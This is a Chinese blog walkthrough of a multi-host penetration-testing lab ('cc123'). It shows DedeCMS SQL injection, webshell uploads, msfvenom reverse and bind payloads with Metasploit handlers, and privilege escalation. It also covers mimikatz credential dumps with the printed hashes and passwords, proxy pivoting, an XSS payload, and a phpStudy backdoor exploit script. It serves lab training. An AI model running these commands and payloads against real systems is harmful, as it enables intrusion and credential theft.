---
title: 暗月项目四-cc123
author: 干脆面
tags:
  - "moonsec\U0001F31B"
categories:
  - "安全\U0001F510"
top: 6
abbrlink: 855acbe9
date: 2022-01-05 09:13:46
---
## cc123靶场拓扑图

![image-20220105141605099](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220105141605099.png)

<!-- more -->

共包含4个flag

（因个人实验环境的特殊情况，使用了两台kali攻击机，IP分别为192.168.137.22与192.168.137.185）

## 1.信息收集

### 1.0 创建文件夹

![image-20220105142954593](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220105142954593.png)

### 1.1 主机发现

```
sudo net discover -i eth0 -r 192.168.134.0/24
```

![image-20220105142140390](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220105142140390.png)

### 1.2 端口扫描

```
sudo masscan -p 1-65535 192.168.137.134 --rate=1000
```

![image-20220105143946034](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220105143946034.png)

### 1.3 端口信息探测

```
sudo nmap -sC -A 192.168.137.134 -p53,80,135,999,3389,6588,49154,49155 -oA cc123-port
```

![image-20220105144634836](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220105144634836.png)

### 1.4 网站信息

![image-20220105150414683](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220105150414683.png)

![image-20220105150446843](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220105150446843.png)

![image-20220105150517846](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220105150517846.png)

### 1.5 绑定本地hosts/网关设置

```
windows:
绑定hosts
C:\Windows\System32\drivers\etc
192.168.137.134 www.cc123.com
DNS：192.168.137.134

kali:
sudo vi /etc/hosts
192.168.137.134 www.cc123.com
sudo vi /etc/resolv.conf
nameserver 192.168.137.134
```

### 1.6 子域名穷举

```
wfuzz -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -u cc123.com -H "Host:FUZZ.cc123.com" --hw 53
#kali内总是报错 查不出原因 
```

![image-20220105161044599](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220105161044599.png)

| KesionEDU | www.cc123.com |
| --------- | ------------- |
| dedecms   | new.cc123.com |
| Net       | ww2.cc123.com |

## 2.漏洞测试

### 2.1 dedecms安全测试

#### 查看版本号

```
http://new.cc123.com/data/admin/ver.txt
```

![image-20220105162605149](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220105162605149.png)

版本为20150618 该版本存在注入漏洞

![image-20220117103642064](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220117103642064.png)

#### 查看管理后台是否开启

```
http://new.cc123.com/dede
```

![image-20220105163030212](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220105163030212.png)

管理后台开启，尝试默认密码，错误失败

#### 查看会员注册是否开启

/member -- 发现开放会员注册 -- 注册用户 -- byesec --  登录

![image-20220105161436256](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220105161436256.png)

![image-20220105161801696](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220105161801696.png)

![image-20220105161920404](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220105161920404.png)

#### 注入漏洞利用

##### 新建分类

![image-20220105165343523](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220105165343523.png)

##### 复制cookie

![image-20220105165827417](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220105165827417.png)

![image-20220105165957478](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220105165957478.png)

##### 配置exp

放入exp目录下的cookie.txt文件内并修改exp

![image-20220105170208038](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220105170208038.png)

##### 执行exp

```
python Dedecms_20150618_member_sqli.py http://new.cc123.com
```

![image-20220105171636328](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220105171636328.png)

得到加密的密码 812df726be884ddcfc41

![image-20220105171806378](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220105171806378.png)

最终的到admin的密码为admin7788

##### 进入后台管理系统登陆

```
http://new.cc123.com/dede
admin
admin7788
```

![image-20220105172007094](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220105172007094.png)

登陆成功

![image-20220105172052018](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/1627image-20220105172052018.png)

上传一句话木马

![image-20220105172143524](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/1629image-20220105172143524.png)

写入木马上传

![image-20220105172401188](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/1629image-20220105172401188.png)

![image-20220105172603430](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/1630image-20220105172603430.png)

![image-20220105172637529](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/1631image-20220105172637529.png)

使用蚁剑连接

![image-20220105173951031](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/1631image-20220105173951031.png)

#### 提权

在蚁剑内翻阅目录发现权限不足

![image-20220105173951031](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/1632image-20220105173951031.png)

发现在目录下是NET环境，尝试上传.NET文件看能否解析执行

![image-20220105175318757](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/1632image-20220105175318757.png)

上传webshell到根部录下的/a内

![image-20220106093024524](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/1634image-20220106093024524.png)

访问ASPXSpy2014.aspx

```
http://new.cc123.com/a/ASPXSpy2014.aspx
```

输入密码admin

![image-20220106094028758](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/1640image-20220106094028758.png)

![image-20220106094241337](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/1641image-20220106094241337.png)

尝试是否可以执行命令

![image-20220106094315945](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/1642image-20220106094315945.png)

结果显示可以执行命令

下一步的思路是：能否在msf内生成payload执行以达到提权的目的

msf生成payload

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.137.22 lport=12345 -f exe >s.exe
```

![image-20220106095651519](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/1643image-20220106095651519.png)

上传生成的s.exe，发现可能是写权限不足

![image-20220106095955787](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/1643image-20220106095955787.png)

上传使用wt.asp脚本来扫描可写目录

![image-20220106100241167](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/1644image-20220106100241167.png)

```
访问http://new.cc123.com/a/wt.asp
```

![image-20220106101417517](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/1644image-20220106101417517.png)

![image-20220106101518186](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/1645image-20220106101518186.png)

尝试向c:\windows\debug\WIA\目录内上传s.exe

![image-20220106101921905](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220106101921905.png)

上传成功后配置msf

```
msfconsole

use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp

set lhost 192.168.137.22

set lport 12345

run
```

![image-20220106102311623](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/1646image-20220106102311623.png)

执行s.exe

![image-20220106102603447](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/1647image-20220106102603447.png)

成功反弹shell

![image-20220106102643899](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/1647image-20220106102643899.png)

```
ipconfig
```

![image-20220106102917805](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/1648image-20220106102917805.png)

```
getuid
```

![image-20220106103001792](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/1649image-20220106103001792.png)

```
background
```

```
use post/multi/recon/local_exploit_suggester

show options

set session 1

run
```

![image-20220106103658401](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/1649image-20220106103658401.png)

⚠️：kali的msf内没有可用的exp

![image-20220106110056898](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220106110056898.png)

⚠️：经过询问得知是新版本的kali内的msf对本项目，在提权的时候存在一些不可知的问题，故采用老版本的kali2020.1进行尝试

重新生成c.exe-执行反弹shell-搜索可用的本地提权

![image-20220106122617785](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220106122617785.png)

```
use exploit/windows/local/ms16_075_reflection_juicy
show options
set session 1
run
```

```
getuid
```

![image-20220106122930265](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220106122930265.png)

成功提权至系统权限

查看flag

### 2.2 ww2.cc123.com安全测试

![image-20220106142531457](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220106142531457.png)

复制响应头

![image-20220106142657082](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/165616image-20220106142657082.png)

分析响应头

仍然为ASP.NET 版本4.0

![image-20220106142755251](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/165616image-20220106142755251.png)

#### 目录扫描

gobuster连接超时

```
gobuster dir -u http://ww2.cc123.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 'aspx,html' -o ~/cc123/cc123-ww2-dir.log
```

![image-20220106154748426](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220106154748426.png)

dirsearch连接超时

```
dirsearch -u http://ww2.cc123.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e aspx,html -o cc123-ww2.log
```

![image-20220114165917028](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/165916image-20220114165917028.png)

可能是因为配置原因..在kali内这两个工具都无法连接

救急采用了御剑

![image-20220106161641310](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/165916image-20220106161641310.png)

```
访问http://ww2.cc123.com/admin
```

![image-20220106161849933](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/165916image-20220106161849933.png)

尝试了默认密码/弱口令等无果

![image-20220106162204624](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/170017image-20220106162204624.png)

使用burpsuite对该页面进行抓包分析

![image-20220106162836820](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/170017image-20220106162836820.png)

右键--Request in browser--in original session--copy--浏览器访问

![image-20220106163347072](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/170017image-20220106163347072.png)

重复提交包，并未对验证码进行校验（可能存在验证码重复利用漏洞），可直接发送至Intruder模块对其进行密码的爆破

#### 后台登陆页-SQL注入漏洞

在Repeater内检测

修改用户名为admin' 但结果并没有报错

![image-20220106163915371](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/170017image-20220106163915371.png)

修改用户名为admin'--+ 尝试注释后面的语句 页面发生了重定向

![image-20220106164038132](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/170117image-20220106164038132.png)

猜测其查询语句大致为：

```
select * from users where username='admin' and password='123456'
```

添加注释后则为

```
select * from users where username='admin'-- ' and password='123456'
select * from users where username='admin' #则只执行了该语句
```

在浏览器内尝试提交用户名admin'--空格   密码任意

利用该漏洞成功以管理员身份登陆进入了后台管理系统

![image-20220106164749119](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/170117image-20220106164749119.png)

#### 后台内-SQLMAP测试SQL注入

![image-20220110101910993](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/170117image-20220110101910993.png)

将抓取到的页面包放入SQLMAP中进行测试（bp.txt）

测试是否存在注入

```
sqlmap -r bp.txt --dbms mssql -v 1 --batch
```

![image-20220114170228801](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220114170228801.png)

列库

```
sqlmap -r bp.txt --dbms mssql -v 1 --dbs
```

![image-20220114170354079](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220114170354079.png)

查询数据无法直接看到

```
sqlmap -r bp.txt --dbms mssql -v 1 -D grams_data -T username --dump
```

![image-20220110104337746](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220110104337746.png)

获取mssql的shell

```
sqlmap -r bp.txt --dbms mssql -v 1 --os-shell
```

![image-20220110103712249](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220110103712249.png)

![image-20220110103804859](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220110103804859.png)

![image-20220110103943402](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/170517image-20220110103943402.png)

主机名为WIN-JJU7KU45PN7。根据以上信息猜测为站库分离。

#### .NET代码审计

```
cd c:\HwsHostMaster\wwwroot\ww2cc123_55m39g\web\bin
```

![image-20220110105330264](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220110105330264.png)

![image-20220110105456556](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220110105456556.png)

下载

```
download c:\HwsHostMaster\wwwroot\ww2cc123_55m39g\web\bin
```

![image-20220110105910519](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220110105910519.png)

![image-20220110110050372](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220110110050372.png)

拷贝至本地IlSpy反编译dll进行审计

![image-20220114090608874](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/172217image-20220114090608874.png)

##### 验证码重复使用漏洞

![image-20220110115555917](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/172317image-20220110115555917.png)漏洞验证

![image-20220110115925979](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/172417image-20220110115925979.png)

![image-20220110120137804](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/172517image-20220110120137804.png)

##### 后台管理登陆SQL注入漏洞

![image-20220114091117775](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/172517image-20220114091117775.png)

漏洞验证

![image-20220114093100487](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/172517image-20220114093100487.png)

![image-20220114093122880](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220114093122880.png)

##### 后台文件SQL注入漏洞

![image-20220114095030882](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220114095030882.png)

![image-20220114093515301](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220114093515301.png)

![image-20220114095243902](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220114095243902.png)

漏洞验证

![image-20220114100149401](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220114100149401.png)

##### 后台编辑器KindEditor漏洞

![image-20220114100045676](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220114100045676.png)

![image-20220114103106885](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220114103106885.png)

![image-20220114100424391](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/172717image-20220114100424391.png)

![image-20220114100512643](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/172817image-20220114100512643.png)

![image-20220114100540040](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/172817image-20220114100540040.png)

抓包修改验证

![image-20220114101155076](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/172817image-20220114101155076.png)

![image-20220114101256651](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/172817image-20220114101256651.png)

![image-20220114101629577](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/172817image-20220114101629577.png)

访问ww2.cc123.com/editor/asp.net/../attached/file/20220114/20220114101159_6235.html

成功弹回cookie

![image-20220114101957669](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/172917image-20220114101957669.png)

##### 前台XSS漏洞

查看前台文件

![image-20220114105555276](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220114105555276.png)

![image-20220114105913840](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220114105913840.png)

访问该文件

![image-20220114110232582](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/1717n0zaUzimage-20220114110232582.png)

![image-20220114110321901](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/1717I9ZyG1image-20220114110321901.png)

构造payload

```
http://ww2.cc123.com/mystat.aspx?style=</script><script>alert(/xss/);</script><script>
```

![image-20220114113621777](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/1717cS3q71image-20220114113621777.png)

#### 后台用户名密码秘文解密

之前得到利用SQL MAP得到的用户名和密码都是无法直接获取的

![image-20220114120243875](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220114120243875.png)

利用工具

查询配置文件中的数据库连接信息

```
cat web.config
```

![image-20220114120617365](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220114120617365.png)

将其放入工具中 Go连接

![image-20220114121533124](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/1717txn1Hfimage-20220114121533124.png)

查询admin表内的数据

```
select * from admin
```

![image-20220114121751133](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/1717hdyMuJimage-20220114121751133.png)

得到用户名密码信息

| id  | username | password                         | roleId |
| --- | -------- | -------------------------------- | ------ |
| 28  | admin    | AE5F6187F32825CA                 | 1      |
| 30  | cc123    | B97C57DB005F954242450A255217DA9F | 1      |

在MD5在线平台进行解密发现失败

寻找加密方法

![image-20220114142301537](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/1621image-20220114142301537.png)

![image-20220114142325595](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/08/05/image-20220114142325595.png)

解密方法

![image-20220117130802644](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117130802644.png)

编写解密小工具

![image-20220117125851927](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117125851927.png)

![image-20220117125940559](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117125940559.png)

填写key进行解密

![image-20220117130215277](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117130215277.png)

![image-20220117130338775](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117130338775.png)

| id  | username | password  | roleId |
| --- | -------- | --------- | ------ |
| 28  | admin    | cc123     | 1      |
| 30  | cc123    | qweasd123 | 1      |

## 3.内网渗透

### 3.1web服务器

#### 网段梳理

```
ipconfig
```

192.168.137.134

10.10.10.135

![image-20220117150336674](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117150336674.png)

#### 获取路由信息

```
run get_local_subnets
```

![image-20220117151100055](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117151100055.png)

#### 查看权限

```
getuid
```

![image-20220117151331624](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117151331624.png)

#### 迁移进程

```
ps
```

![image-20220117151748225](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117151748225.png)

```
migrate 1580
```

![image-20220117151907379](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117151907379.png)

#### 获取哈希密码明文

```
run hashdump
```

![image-20220117165606506](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117165606506.png)

> Administrator:500:aad3b435b51404eeaad3b435b51404ee:1c933df09b600efabee0791aaccc43f2:::
> 
> Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
> 
> MySQL_HWS:1001:aad3b435b51404eeaad3b435b51404ee:6a75a75e4cfd3cf00faf743e17e90a53:::
> 
> PhpMyAdmin_HWS:1002:aad3b435b51404eeaad3b435b51404ee:a14b615c584d6b043f42f1cfab9779cd:::
> 
> huweishen542147:1004:aad3b435b51404eeaad3b435b51404ee:c76eea2615348c5228f7027d3ccab02d:::
> 
> cc123:1005:aad3b435b51404eeaad3b435b51404ee:afdeb425b4a55982deb4e80fa3387576:::
> 
> newcc123:1007:aad3b435b51404eeaad3b435b51404ee:97824315153b4dd665d6c688f446ebf1:::
> 
> ww2cc123:1008:aad3b435b51404eeaad3b435b51404ee:adadf2dd832421c26a96705fd09a32bd:::

```
load mimikatz
```

```
mimikatz_command -f samdump::hashes
```

![image-20220117170110495](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117170110495.png)

```
mimikatz_command -f sekurlsa::searchPasswords
```

![image-20220117170931096](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117170931096.png)

```
wdigest/tspkg
```

![image-20220117171103054](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117171103054.png)

管理员的账号和密码：Administrator !@#Qwe123.

### 3.2数据库服务器

#### 添加路由

```
run autoroute -s 10.10.10.0/24
```

```
run autoroute -p
```

![image-20220117172004612](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117172004612.png)

```
background 
```

```
use auxiliary/server/sock4a
```

```
show options
```

```
set SRVPORT 2222
```

![image-20220117174652378](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117174652378.png)

#### 配置proxychains

kali攻击机：

```
sudo vim /etc/proxychains.conf
```

绑定本机

```
socks4 127.0.0.1 2222
```

![image-20220117174848494](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117174848494.png)

#### NMAP扫描

```
proxychains nmap -sT -Pn 10.10.10.136
```

扫描速度比较慢 在扫描过程中发现80端口开放

测试是否可以访问

```
proxychains firefox http://10.10.10.136
```

访问结果为不可访问

![image-20220117185650203](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117185650203.png)

#### 数据库服务器信息整理

```
os-shell>netstat -ano
```

![image-20220118144511896](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220118144511896.png)

```
os-shell>ipconfig
```

![image-20220118144711979](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220118144711979.png)

#### 生成正向连接的攻击载荷

```
msfvenom -p windows/meterpreter/bind_tcp LPORT=13777 -f exe > bind.exe
```

![image-20220118145830046](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220118145830046.png)

上传载荷

![image-20220118151146581](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220118151146581.png)

执行载荷

![image-20220118151224280](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220118151224280.png)

#### 连接获取session

```
use exploit/multi/handler
set payload windows/meterpreter/bin_tcp
set LPORT 13777
set RHOST 10.10.10.136
run
```

![image-20220118153143998](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220118153143998.png)

![image-20220118153232512](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220118153232512.png)

#### 网段梳理

```
ipconfig
```

10.10.10.136

10.10.1.128

![img](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-15-45-27-image.png)

#### 获取路由信息

```
run get_local_subnets
```

![img](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-15-47-37-image.png)

#### 查看权限

![img](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-15-47-57-image.png)

#### 迁移进程

```
ps
```

![img](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-15-48-46-image.png)

```
migrate 1532
```

![img](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-15-49-25-image.png)

获取哈希密码明文

```
run hashdump
```

![img](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-15-50-30-image.png)

> Administrator:500:aad3b435b51404eeaad3b435b51404ee:15132c3d36a7e5d7905e02b478979046::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

```
load mimikatz
mimikatz_command -f samdump::hashes
```

![img](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-15-58-31-image.png)

```
mimikatz_command -f sekurlsa::searchPasswords
```

![img](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-16-00-52-image.png)

```
wdigest/tspkg
```

![img](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-16-02-23-image.png)

管理员的账号和密码：Administrator !@#QWEasd123.

### 3.3目标服务器

#### 添加路由

```
run autoroute -s 10.10.1.0/24
run autoroute -p
```

![img](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-16-32-51-image-2560742.png)

NMAP扫描

```
proxychains nmap -sT -Pn 10.10.1.129
```

![img](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-17-58-57-image-2560742.png)

扫描速度比较慢 ，在扫描过程中发现80端口开放，测试是否可以访问

```
proxychains3 firefox http://10.10.1.129
```

![img](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-16-47-17-image-2560743.png)

发现是phpstudy PHP版本为5.4.45

搜索phpstudy后门事件

![img](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-16-59-33-image-2560742.png)

![img](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-17-08-29-image-2560741.png)

> 参考链接：
> 
> [phpStudy后门漏洞复现_LuckySec-CSDN博客_phpstudy漏洞](https://blog.csdn.net/weixin_43571641/article/details/119831173)
> 
> [phpStudy后门漏洞利用复现 - 雨中落叶 - 博客园](https://www.cnblogs.com/yuzly/p/11610061.html)

#### 编写phpstudy后门exp

```
vim phpstudy.py
```

![img](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-18-14-03-image-2560741.png)

> \#conding:utf-8
> 
> import requests import sys import base64
> 
> shell = "system('"+sys.argv[1]+"');" shell_base64 = base64.b64encode(shell.encode('utf-8'))
> 
> header={'Accept-charset':shell_base64,'Accept-Encoding':'gzip,deflate'}
> 
> def exploit(url): html = requests.get(url=url,headers=header).text return html
> 
> url = "http://10.10.1.129/" print(exploit(url))

##### 写入一句话木马

```
proxychains3 python3 phpstudy.py "echo ^<?php @eval(\$_POST[\"shell\"])?^>>c:\phpstudy\WWW\shell.php"
```

![img](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-18-17-47-image-2560742.png)

##### 访问后门shell.php

![img](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-18-19-24-image-2560742.png)

#### 使用SocksCap64设置本机代理

##### kali内配置proxychains

确认kali的IP

![img](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-18-27-52-image-2560742.png)

```
sudo vim /etc/proxychains.conf
```

![img](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-18-30-20-image-2560741.png)

##### 本机内添加代理

![img](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-18-34-57-image-2560742.png)

测试代理是否正常

![img](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-18-35-52-image-2560742.png)

##### 代理蚁剑

![img](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-18-47-33-image-2560742.png)

![img](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-18-48-28-image-2560742.png)

![img](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-18-49-01-image-2560742.png)

![img](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-18-54-48-image-2560742.png)

##### 正向连接

上传bind.exe

![img](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-18-52-54-image-2560742.png)

##### 执行bind.exe

![img](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-18-55-36-image-2560742.png)

##### 生成正向连接的攻击载荷

```
background
set LPORT 13777
set RHOST 10.10.1.129
run
```

![img](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-19-09-19-10-image-2560744.png)

##### 迁移进程

```
ps
```

![img](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-19-09-21-54-image-2560744.png)

```
migrate 1340
```

![img](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-19-09-22-36-image-2560742.png)

```
shell
arp -a
systeminfo
Ctrl+C返回
```

